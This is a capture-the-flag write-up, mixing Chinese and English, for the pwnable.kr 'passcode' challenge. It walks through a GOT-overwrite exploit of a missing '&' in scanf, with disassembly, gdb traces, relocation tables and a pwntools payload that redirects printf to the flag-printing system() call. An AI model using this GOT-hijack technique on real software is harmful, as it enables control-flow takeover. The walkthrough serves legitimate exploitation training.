# passcode
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

    passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped
```
```=
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}

```
原本scanf()裡面 要加＆但是呢 這題沒有加上

如果可以控制passcode 1 2 就可以直接以 passcode的值 為位址  =>  *(passcode)

因為call welcome 和 login 時 ebp 都一樣 所以 可以利用 

passcode and name 空間會重複 
![](https://raw.githubusercontent.com/x890311x/pwnable_kr/master/passcode/stack.png)



got hijack print 0804a000 改成  binsh 0x080485e3

### 下面不要管 當初不知道在寫啥鬼
~~
照正常走法 打完name 進入 打 passcode 但是它會噴 `Segmentation fault (core dumped)`~~

後來發現 我用 scp載回來

發現根本寫壞了 正常法根本進不去

ssh
```=
passcode@prowl:~$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : 0
Welcome 0!
enter passcode1 : 0
Segmentation fault (core dumped)
```
local
```=
./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : 338150
Welcome 338150!
enter passcode1 : 338150
enter passcode2 : 13371337
[1]    24325 segmentation fault (core dumped)  ./passcode
```

~~所以 在輸入name 時就要 overflow~~
```=
sym.welcome ();
|           ; var int local_70h @ ebp-0x70
|           ; var int local_ch @ ebp-0xc
|           ; var int local_4h @ esp+0x4
|           ; CALL XREF from sym.main (0x804867a)
|           0x08048609      55             push ebp
|           0x0804860a      89e5           mov ebp, esp
|           0x0804860c      81ec88000000   sub esp, 0x88
|           0x08048612      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=-1 ; 20
|           0x08048618      8945f4         mov dword [local_ch], eax
|           0x0804861b      31c0           xor eax, eax
|           0x0804861d      b8cb870408     mov eax, str.enter_you_name_: ; 0x80487cb ; "enter you name : "
|           0x08048622      890424         mov dword [esp], eax
|           0x08048625      e8f6fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0804862a      b8dd870408     mov eax, str.100s           ; 0x80487dd ; "%100s"
|           0x0804862f      8d5590         lea edx, dword [local_70h]
|           0x08048632      89542404       mov dword [local_4h], edx
|           0x08048636      890424         mov dword [esp], eax
|           0x08048639      e862feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
|           0x0804863e      b8e3870408     mov eax, str.Welcome__s     ; 0x80487e3 ; "Welcome %s!\n"
|           0x08048643      8d5590         lea edx, dword [local_70h]
|           0x08048646      89542404       mov dword [local_4h], edx
|           0x0804864a      890424         mov dword [esp], eax
|           0x0804864d      e8cefdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048652      8b45f4         mov eax, dword [local_ch]
|           0x08048655      653305140000.  xor eax, dword gs:[0x14]
|       ,=< 0x0804865c      7405           je 0x8048663
|       |   0x0804865e      e8ddfdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-> 0x08048663      c9             leave
\           0x08048664      c3             ret
```
```=
sym.login ();
|           ; var int local_10h @ ebp-0x10
|           ; var int local_ch @ ebp-0xc
|           ; var int local_4h @ esp+0x4
|           ; CALL XREF from sym.main (0x804867f)
|           0x08048564      55             push ebp
|           0x08048565      89e5           mov ebp, esp
|           0x08048567      83ec28         sub esp, 0x28               ; '('
|           0x0804856a      b870870408     mov eax, str.enter_passcode1_: ; 0x8048770 ; "enter passcode1 : "
|           0x0804856f      890424         mov dword [esp], eax
|           0x08048572      e8a9feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048577      b883870408     mov eax, 0x8048783
|           0x0804857c      8b55f0         mov edx, dword [local_10h]
|           0x0804857f      89542404       mov dword [local_4h], edx
|           0x08048583      890424         mov dword [esp], eax
|           0x08048586      e815ffffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
|           0x0804858b      a12ca00408     mov eax, dword [obj.stdin__GLIBC_2.0] ; loc.__bss_start ; [0x804a02c:4]=0
|           0x08048590      890424         mov dword [esp], eax
|           0x08048593      e898feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
|           0x08048598      b886870408     mov eax, str.enter_passcode2_: ; 0x8048786 ; "enter passcode2 : "
|           0x0804859d      890424         mov dword [esp], eax
|           0x080485a0      e87bfeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080485a5      b883870408     mov eax, 0x8048783
|           0x080485aa      8b55f4         mov edx, dword [local_ch]
|           0x080485ad      89542404       mov dword [local_4h], edx
|           0x080485b1      890424         mov dword [esp], eax
|           0x080485b4      e8e7feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
|           0x080485b9      c70424998704.  mov dword [esp], str.checking... ; [0x8048799:4]=0x63656863 ; "checking..."
|           0x080485c0      e88bfeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485c5      817df0e62805.  cmp dword [local_10h], 0x528e6
|       ,=< 0x080485cc      7523           jne 0x80485f1
|       |   0x080485ce      817df4c907cc.  cmp dword [local_ch], 0xcc07c9
|      ,==< 0x080485d5      751a           jne 0x80485f1
|      ||   0x080485d7      c70424a58704.  mov dword [esp], str.Login_OK ; [0x80487a5:4]=0x69676f4c ; "Login OK!"
|      ||   0x080485de      e86dfeffff     call sym.imp.puts           ; int puts(const char *s)
|      ||   0x080485e3      c70424af8704.  mov dword [esp], str.bin_cat_flag ; [0x80487af:4]=0x6e69622f ; "/bin/cat flag"
|      ||   0x080485ea      e871feffff     call sym.imp.system         ; int system(const char *string)
|      ||   0x080485ef      c9             leave
|      ||   0x080485f0      c3             ret
|      ``-> 0x080485f1      c70424bd8704.  mov dword [esp], str.Login_Failed ; [0x80487bd:4]=0x69676f4c ; "Login Failed!"
|           0x080485f8      e853feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485fd      c70424000000.  mov dword [esp], 0
\           0x08048604      e877feffff     call sym.imp.exit           ; void exit(int status)
```
用gdb 跟 在輸入第二個passcode後 就爆炸
```=
Stopped reason: SIGSEGV
0xf7e08914 in ?? () from /lib/i386-linux-gnu/libc.so.6
```
ebp-0x70 name

ebp-0x10 passcode1

ebp-0xc  passcode2

0x080485e3 sh

原本想要在welcome就直接return 到 sh 但是不行  沒有buf

後來爬了文 發現 scanf 沒有加 `&` and `如果没有用取地址符，程序会使用栈上的数据作为指针存放输入的数据。`

又兩個函數的ebp 都一樣 網上找到  `通过代码可以看到在执行了welcome函数后立即执行了login函数，中间没有压栈弹栈操作，也没有开alsr等保护，因此二者的ebp是相同的。而name数组长度是100，因此分配的栈块较大，并且passcode没有赋初值，`

開幹  這題是 GOT HIJACKING

```=readelf -r passcode                                                          

Relocation section '.rel.dyn' at offset 0x388 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__
0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x398 contains 9 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
```

在 welcome 時輸入 `r.sendline('a'*96+'\x00\xa0\x04\x08')`

ebp-0x10 就是 passcode1

移來移去

剛剛好 name的最後4byte 就是 passcode1

寫上 要修改的got位置

然後 輸入passcode1時 輸入/bin/sh 的位置 輸入時因為是吃int 所以要轉成dec

當初就是不知道為啥 要這樣解

原本有加 `＆` 的話 它就會寫入 指標裡的位置

沒有加 就是直接朝 位置寫上去
```=
0x804857c <login+24>:    mov    edx,DWORD PTR [ebp-0x10]
```
上面這就是
```=
[----------------------------------registers-----------------------------------]
EAX: 0x8048783 --> 0x65006425 ('%d')
EBX: 0x0
ECX: 0x0
EDX: 0x804a000 --> 0xf7e19620 (<printf>:	call   0xf7f05689)
ESI: 0xf7fa4000 --> 0x1dbd6c
EDI: 0xf7fa4000 --> 0x1dbd6c
EBP: 0xffbe68d8 --> 0xffbe68f8 --> 0x0
ESP: 0xffbe68b0 --> 0x8048770 ("enter passcode1 : ")
EIP: 0x804857f (<login+27>:	mov    DWORD PTR [esp+0x4],edx)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048572 <login+14>:	call   0x8048420 <printf@plt>
   0x8048577 <login+19>:	mov    eax,0x8048783
   0x804857c <login+24>:	mov    edx,DWORD PTR [ebp-0x10]
=> 0x804857f <login+27>:	mov    DWORD PTR [esp+0x4],edx
   0x8048583 <login+31>:	mov    DWORD PTR [esp],eax
   0x8048586 <login+34>:	call   0x80484a0
[------------------------------------stack-------------------------------------]
0000| 0xffbe68b0 --> 0x8048770 ("enter passcode1 : ")
0004| 0xffbe68b4 ('a' <repeats 20 times>)
0008| 0xffbe68b8 ('a' <repeats 16 times>)
0012| 0xffbe68bc ('a' <repeats 12 times>)
0016| 0xffbe68c0 ("aaaaaaaa")
0020| 0xffbe68c4 ("aaaa")
0024| 0xffbe68c8 --> 0x804a000 --> 0xf7e19620 (<printf>:	call   0xf7f05689)
0028| 0xffbe68cc --> 0x3d8d5200
[------------------------------------------------------------------------------]
```
擺好後 發現 它會寫入 got table
```=
EAX: 0x8048783 --> 0x65006425 ('%d')
EBX: 0x0
ECX: 0x0
EDX: 0x804a000 --> 0xf7e19620 (<printf>:	call   0xf7f05689)
ESI: 0xf7fa4000 --> 0x1dbd6c
EDI: 0xf7fa4000 --> 0x1dbd6c
EBP: 0xffbe68d8 --> 0xffbe68f8 --> 0x0
ESP: 0xffbe68b0 --> 0x8048783 --> 0x65006425 ('%d')
EIP: 0x8048586 (<login+34>:	call   0x80484a0 <__isoc99_scanf@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804857c <login+24>:	mov    edx,DWORD PTR [ebp-0x10]
   0x804857f <login+27>:	mov    DWORD PTR [esp+0x4],edx
   0x8048583 <login+31>:	mov    DWORD PTR [esp],eax
=> 0x8048586 <login+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x804858b <login+39>:	mov    eax,ds:0x804a02c
   0x8048590 <login+44>:	mov    DWORD PTR [esp],eax
   0x8048593 <login+47>:	call   0x8048430 <fflush@plt>
   0x8048598 <login+52>:	mov    eax,0x8048786
Guessed arguments:
arg[0]: 0x8048783 --> 0x65006425 ('%d')
arg[1]: 0x804a000 --> 0xf7e19620 (<printf>:	call   0xf7f05689)
[------------------------------------stack-------------------------------------]
0000| 0xffbe68b0 --> 0x8048783 --> 0x65006425 ('%d')
0004| 0xffbe68b4 --> 0x804a000 --> 0xf7e19620 (<printf>:	call   0xf7f05689)
0008| 0xffbe68b8 ('a' <repeats 16 times>)
0012| 0xffbe68bc ('a' <repeats 12 times>)
0016| 0xffbe68c0 ("aaaaaaaa")
0020| 0xffbe68c4 ("aaaa")
0024| 0xffbe68c8 --> 0x804a000 --> 0xf7e19620 (<printf>:	call   0xf7f05689)
0028| 0xffbe68cc --> 0x3d8d5200
```
![](https://raw.githubusercontent.com/x890311x/pwnable_kr/master/passcode/asm.png)
